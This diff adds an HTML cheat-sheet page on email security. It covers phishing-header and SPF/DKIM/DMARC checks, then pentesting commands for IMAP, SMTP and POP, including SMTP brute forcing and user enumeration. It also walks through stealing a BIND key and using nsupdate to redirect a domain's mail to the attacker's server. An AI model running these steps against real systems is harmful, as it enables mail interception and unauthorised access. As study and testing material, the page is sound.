@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Email Analysis - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Email Analysis", url: "#_top", children: [
+              {title: "OSINT", url: "#osint" },
+              {title: "Email Source Analysis", url: "#email-source-analysis" },
+              {title: "Check SPF, DKIM, DMARC Records of Domain", url: "#check-spf-dkim-dmarc-records-of-domain" },
+              {title: "Be Careful of Fake Reply Message", url: "#be-careful-of-fake-reply-message" },
+              {title: "Malware Detection in Attached Files", url: "#malware-detection-in-attached-files" },
+          ]},
+          {title: "IMAP (Internet Message Access Protocol) Pentesting", url: "#imap-internet-message-access-protocol-pentesting", children: [
+              {title: "Enumeration", url: "#enumeration" },
+              {title: "Connect", url: "#connect" },
+              {title: "Commands", url: "#commands" },
+          ]},
+          {title: "SMTP (Simple Mail Transfer Protocol) Pentesting", url: "#smtp-simple-mail-transfer-protocol-pentesting", children: [
+              {title: "Enumeration", url: "#enumeration_1" },
+              {title: "Connect", url: "#connect_1" },
+              {title: "Commands", url: "#commands_1" },
+              {title: "Send Mails from External", url: "#send-mails-from-external" },
+              {title: "Start SMTP Server", url: "#start-smtp-server" },
+          ]},
+          {title: "Receive Email as Another Address", url: "#receive-email-as-another-address", children: [
+              {title: "Exploit DNS Zone Misconfiguration \u0026amp; BIND Config", url: "#exploit-dns-zone-misconfiguration-bind-config" },
+          ]},
+          {title: "POP (Post Office Protocol) Pentesting", url: "#pop-post-office-protocol-pentesting", children: [
+              {title: "Enumeration", url: "#enumeration_2" },
+              {title: "Connect", url: "#connect_2" },
+              {title: "Commands", url: "#commands_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="email-analysis">Email Analysis</h1>
+<p>Detecting malware from messages, check if they are phishing.</p>
+<div class="language-text highlight"><pre><span></span><code>- [email-spoofing](https://www.crowdstrike.com/cybersecurity-101/spoofing-attacks/email-spoofing/)
+</code></pre></div>
+<h2 id="osint">OSINT</h2>
+<ul>
+<li>
+<p><strong><a href="https://labs.inquest.net/">InQuest Labs</a></strong></p>
+</li>
+<li>
+<p><strong><a href="https://mha.azurewebsites.net/">Message Header Analyzer</a></strong></p>
+<p>Analyses message header of email. It helps to check the phishing emails.</p>
+</li>
+<li>
+<p><strong><a href="https://www.phishtool.com/">PhishTool</a></strong></p>
+<p>Combines threat intelligence, OSINT, email metadata and battle tested auto-analysis pathways into one powerful phishing response platform.</p>
+</li>
+<li>
+<p><strong><a href="https://emailrep.io/">Simple Email Reputation</a></strong></p>
+<p>Paste the sender’s email address to check if the address is suspicious.</p>
+</li>
+<li>
+<p><strong><a href="https://www.virustotal.com/gui/">VirusTotal</a></strong></p>
+</li>
+</ul>
+<h2 id="email-source-analysis">Email Source Analysis</h2>
+<p>We can see the email source in each provider or execute the following commands.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>open example.xml
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>strings example.eml
+</span></code></pre></div>
+<p>Check the following headers to distinguish whether it is spoofed.</p>
+<h3 id="authentication-results">Authentication-Results</h3>
+<p>Each value in <strong><code>dkim</code>, <code>spf</code>, <code>dmarc</code></strong> should be <strong><code>pass</code></strong>. If not, the email may be spoofed.</p>
+<h3 id="received">Received</h3>
+<p>It should match the sender’s email address.</p>
+<h3 id="received-spf">Received-SPF</h3>
+<p>Its value should be <strong><code>pass</code></strong>. If its value is <strong><code>faile</code>, <code>softfail</code>, <code>neutral</code> or <code>none</code></strong>, the email may be spoofed.</p>
+<h3 id="others">Others</h3>
+<p>Besides, check if the sender displayed name or address match <strong><code>From</code>, <code>Reply-To</code>, <code>Return-Path</code></strong> in headers. However, these header values can be modified by attackers so it could not be relied perfectly.  </p>
+<h2 id="check-spf-dkim-dmarc-records-of-domain">Check SPF, DKIM, DMARC Records of Domain</h2>
+<p>To confirm if these records exist in a domain, use <code>dig</code> command. If not exist, the domain may be spoofed, or may be categorized spam by some email providers.  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>dig example.com txt
+</span></code></pre></div>
+<p>Also we can check that using online tools such as <a href="https://mxtoolbox.com/">MxToolbox</a>.</p>
+<h3 id="spf-record">SPF Record</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>dig example.com txt
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a># output example:
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>example.com.  IN  TXT  &quot;v=spf1 include:spf.example.com -all&quot;
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>example.com.  IN  TXT  &quot;v=spf1 +ip4:10.0.0.1/24 -all&quot;
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>example.com.  IN  TXT  &quot;v=spf1 a:mail.example.com -all&quot;
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>example.com.  IN  TXT  &quot;v=spf1 -all&quot;
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>example.com.  IN  TXT  &quot;v=spf1 mx -all&quot;
+</span></code></pre></div>
+<h3 id="check-dkim-record">Check DKIM Record</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>dig selector._domainkey.example.com txt
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a># output examples:
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>selector._domainkey.example.com  IN  TXT  k=rsa;p=J8eTBu224i086iK
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>selector._domainkey.example.com  IN  TXT  &quot;selector._domainkey.example.com. 0  IN  TXT  &quot;v=DKIM1; p=ABC...123;&quot;&quot;
+</span></code></pre></div>
+<p>To check <code>DKIM</code> record, we need to specify the DKIM selector. It can be found in <code>s=</code> header value of dkim section in email header such as Authentication-Results.  For example,</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Authentication-Results: mx.google.com;
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>  dkim=pass header.i=@example.com header.s=s1234 header.b=ABCDEF123
+</span></code></pre></div>
+<p>In this case, we execute <code>dig [s1234.example.com](http://s1234.example.com) txt</code> .</p>
+<h3 id="check-dmarc-record">Check DMARC Record</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>dig _dmarc.example.com txt
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a># output examples:
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>_dmarc.example.com.  IN  TXT  &quot;v=DMARC1; p=reject; rua=mailto:mailauth-reports@example.com&quot;
+</span></code></pre></div>
+<h2 id="be-careful-of-fake-reply-message">Be Careful of Fake Reply Message</h2>
+<p>If the email contains <strong><code>RE:</code></strong> (Regarding) which means replying your message, we need to check that it’s a really reply message. Attacker may impersonate reply message that victim communicated in the past.</p>
+<h2 id="malware-detection-in-attached-files">Malware Detection in Attached Files</h2>
+<p>If you got email in which attached <strong><code>suspicious</code></strong> files, you need to investigate them.</p>
+<ol>
+<li>
+<p><strong>View the Message Source</strong></p>
+</li>
+<li>
+<p><strong>Copy the Attached File's Base64</strong></p>
+</li>
+<li>
+<p><strong>Change Base64 to SHA256</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sha256sum attached_file.doc
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a># or
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>echo -n &#39;abcde..==&#39; &gt; hash.txt
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>sha256sum hash.txt
+</span></code></pre></div>
+<p>Or there are some useful tools:</p>
+<ul>
+<li><strong><a href="https://gchq.github.io/CyberChef/">CyberChef</a></strong> is useful to change the cipher.</li>
+</ul>
+</li>
+<li>
+<p><strong>Investigate the Hash</strong></p>
+<p>There are some useful tools:</p>
+<ul>
+<li>
+<p><strong><a href="https://labs.inquest.net/">InQuest Labs</a></strong></p>
+</li>
+<li>
+<p><strong><a href="https://www.talosintelligence.com/talos_file_reputation">Talos File Reputation</a></strong></p>
+</li>
+<li>
+<p><strong><a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></strong></p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="imap-internet-message-access-protocol-pentesting">IMAP (Internet Message Access Protocol) Pentesting</h1>
+<p>IMAP is an internet standard protocol used by email clients. Default ports are 143, 993.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nmap --script imap-capabilities -p 143 &lt;target-ip&gt;
+</span></code></pre></div>
+<h3 id="banner-grabbing">Banner Grabbing</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nc -nv &lt;target-ip&gt; 143
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>openssl s_client -connect &lt;IP&gt;:993 -quiet
+</span></code></pre></div>
+<h2 id="connect">Connect</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>telnet 10.0.0.1 143
+</span></code></pre></div>
+<h2 id="commands">Commands</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a># Login
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>a1 login &quot;&lt;username&gt;&quot; &quot;&lt;password&gt;&quot;
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a># Logout
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>a1 logout
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a># Close mailbox
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>a1 close
+</span></code></pre></div>
+<h1 id="smtp-simple-mail-transfer-protocol-pentesting">SMTP (Simple Mail Transfer Protocol) Pentesting</h1>
+<p>It is used for sending e-mail. POP3 or IMAP are used for receiving e-mail. Default ports are 25 (SMTP), 465 (SMTPS), 587 (SMTPS).</p>
+<h2 id="enumeration_1">Enumeration</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>nmap --script smtp-brute -p 25,465,587 &lt;target-ip&gt;
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>nmap --script smtp-commands -p 25,465,587 &lt;target-ip&gt;
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>nmap --script smtp-enum-users -p 25,465,587 &lt;target-ip&gt;
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>nmap --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=example.com -p 25,465,587 &lt;target-ip&gt;
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>nmap --script smtp-vuln-cve2011-1764 -p 25,465,587 &lt;target-ip&gt;
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>nmap --script smtp-* -p 25,465,587 &lt;target-ip&gt;
+</span></code></pre></div>
+<h3 id="mx-domains">MX Domains</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>dig mx example.com
+</span></code></pre></div>
+<h3 id="users">Users</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a># VRFY - check if the user exists in the SMTP server
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>smtp-user-enum -M VRFY -u &lt;username&gt; -t &lt;target-ip&gt;
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>smtp-user-enum -M VRFY -U usernames.txt -t &lt;target-ip&gt;
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a># RCPT - check if the user is allowed to receive mails in the SMTP server
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>smtp-user-enum -M RCPT -u &lt;username&gt; -t &lt;target-ip&gt;
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>smtp-user-enum -M RCPT -U usernames.txt -t &lt;target-ip&gt;
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a># EXPN - reveal the actual email address
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>smtp-user-enum -M EXPN -u &lt;username&gt; -t &lt;target-ip&gt;
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>smtp-user-enum -M EXPN -D &lt;hostname&gt; -U usernames.txt -t &lt;target-ip&gt;
+</span></code></pre></div>
+<h3 id="starttls">STARTTLS</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># port 25
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>openssl s_client -starttls smtp -connect &lt;target-ip&gt;:25
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a># Port 465
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>openssl s_client -crlf -connect &lt;target-ip&gt;:465
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a># Port 587
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>openssl s_client -starttls smtp -crlf -connect &lt;target-ip&gt;:587
+</span></code></pre></div>
+<h2 id="connect_1">Connect</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nc &lt;target-ip&gt; 25
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a># or
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>telnet &lt;target-ip&gt; 25
+</span></code></pre></div>
+<h2 id="commands_1">Commands</h2>
+<p>Commands are not case sensitive.</p>
+<h3 id="ehlo-list-all-supported-enhanced-functions">EHLO - list all supported enhanced functions</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>ehlo example.com
+</span></code></pre></div>
+<ul>
+<li><strong>8BITMIME</strong> - allow to send 8-bit data</li>
+<li><strong>AUTH</strong> - authentication for the SMTP connection</li>
+<li><strong>CHUNKING</strong> - transfer chunks of data</li>
+<li><strong>DSN (Delivery Status Notifications)</strong> - notify delivery status</li>
+<li><strong>ENHANCEDSTATUSCODES</strong> - allow to show more details of the status</li>
+<li><strong>ETRN</strong> - process remote queue</li>
+<li><strong>EXPN</strong> - expand mailing list</li>
+<li><strong>HELP</strong> - help about commands</li>
+<li><strong>PIPELINING</strong> - allow the multiple commands</li>
+<li><strong>SIZE</strong> - maximum message size that can be received</li>
+<li><strong>SMTPUTF8</strong> -</li>
+<li><strong>STARTTLS</strong> - communicate with TLS</li>
+<li><strong>SEND</strong> - send message to terminal</li>
+<li><strong>TURN</strong> - swap client and server</li>
+<li><strong>VRFY</strong> - check if the user exists in the SMTP server</li>
+</ul>
+<h3 id="messages">Messages</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a># 1. check if the user exists
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>vrfy &lt;username&gt;
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>vrfy root
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a># 2. set the address of the mail sender
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>mail from: &lt;username&gt;
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>mail from: root
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>mail from: sender@example.com
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a># 3. set the address of the mail recipient
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>rcpt to: &lt;username&gt;
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>rcpt to: root
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>rcpt to: recipient@example.com
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a># 4. send data of message (the message end with &quot;.&quot;)
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>data
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>subject: Test Mail
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>This is a test mail.
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>.
+</span></code></pre></div>
+<h3 id="others_1">Others</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a># process remote queue
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>etrn example.com
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a># list the mailing list
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>expn example.com
+</span></code></pre></div>
+<h2 id="send-mails-from-external">Send Mails from External</h2>
+<p><strong><a href="https://github.com/jetmore/swaks">swaks</a></strong> is a swiss army knife for SMTP.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>swaks --to remote-user@example.com --from local-user@&lt;local-ip&gt; --server mail.example.com --body &quot;hello&quot;
+</span></code></pre></div>
+<h2 id="start-smtp-server">Start SMTP Server</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a># -n: No setuid
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a># -c: Classname
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>sudo python3 -m smtpd -n -c DebuggingServer 10.0.0.1:25
+</span></code></pre></div>
+<h1 id="receive-email-as-another-address">Receive Email as Another Address</h1>
+<p>With misconfigurations of target system, we might be able to impersonate some email address then receive sensitive email.</p>
+<h2 id="exploit-dns-zone-misconfiguration-bind-config">Exploit DNS Zone Misconfiguration &amp; BIND Config</h2>
+<p>If target host has the domain for email e.g. “mail.example.com” and we can get BIND secret key, we can update</p>
+<h3 id="1-get-bind-secret-key">1. Get BIND Secret Key</h3>
+<p>We need to get the BIND key in the config file.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a># /etc/bind/named.conf
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>key &quot;rndc-key&quot; {
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>    algorithm hmac-sha256;
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>    secret &quot;zBatC828gunRa...bA=&quot;;
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>};
+</span></code></pre></div>
+<h3 id="2-update-dns-zone">2. Update DNS Zone</h3>
+<p>After retrieving the BIND secret, update DNS zone to add the new record for receiving email, with subdomain and our ip address.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a># -d: Debug mode
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a># -y: Set the literal TSIG (Transaction Signature) authentication key.
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>nsupdate -d -y hmac-sha256:rndc-key:zBatC828gunRa...bA= 
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>Creating key...
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>namefromtext
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>keycreate
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a># Enter target domain
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>&gt; server example.com
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a># Enter the new record
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a># 86400: The TTL (Time-To-Live) for the DNS record. Set 86400 seconds (24 hours) here.
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a># IN: Internet
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a># A: A record
+</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a># 10.0.0.1: Set your local ip address
+</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a>&gt; update add mail.example.com 86400 IN A 10.0.0.1
+</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>&gt; send
+</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>Reply from SOA query:
+</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a>...
+</span></code></pre></div>
+<h3 id="3-start-smtp-server">3. Start SMTP Server</h3>
+<p>In local machine, start SMTP server for debugging when receiving email with “mail.example.com” from others.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a># -n: No setuid
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a># -c: Classname
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>sudo python3 -m smtpd -n -c DebuggingServer 10.0.0.1:25
+</span></code></pre></div>
+<p>When receiving email, we should see the output in the terminal.</p>
+<h1 id="pop-post-office-protocol-pentesting">POP (Post Office Protocol) Pentesting</h1>
+<p>Post Office Protocol is an application-layer protocol used by email clients. POP3 is a commonly used version. Default ports are 110, 995.</p>
+<h2 id="enumeration_2">Enumeration</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>nmap --script &quot;pop3-capabilities or pop3-ntlm-info&quot; -p 110 &lt;target-ip&gt;
+</span></code></pre></div>
+<h2 id="connect_2">Connect</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>nc &lt;target-ip&gt; 110
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a># or
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>telnet &lt;target-ip&gt; 110
+</span></code></pre></div>
